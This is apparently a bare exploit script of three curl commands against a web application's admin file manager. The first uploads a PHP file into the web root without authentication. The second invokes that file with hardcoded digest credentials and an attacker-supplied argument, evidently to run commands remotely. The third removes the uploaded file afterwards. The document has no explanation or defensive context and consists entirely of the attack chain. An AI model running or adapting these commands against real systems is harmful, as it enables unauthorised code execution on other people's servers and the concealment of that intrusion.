curl -sk -F "dir_dest=c:/wamp/www/ubipartages/" -F "action=10" -F "upfiles[]=@./test.php" $1/map/admin/codes/ged/news/index.php > /dev/null

curl -sk --digest -u "admin:1984" $1/ubipartages/test.php?test=$2

curl -sk $1/map/admin/codes/ged/news/index.php -d 'frame=3&action=4&dir_dest=&chmod_arg=0666&cmd_arg=&fm_current_dir=c%3A%2Fwamp%2Fwww%2Fubipartages%5C&dir_before=&selected_dir_list=&selected_file_list=test.php' > /dev/null
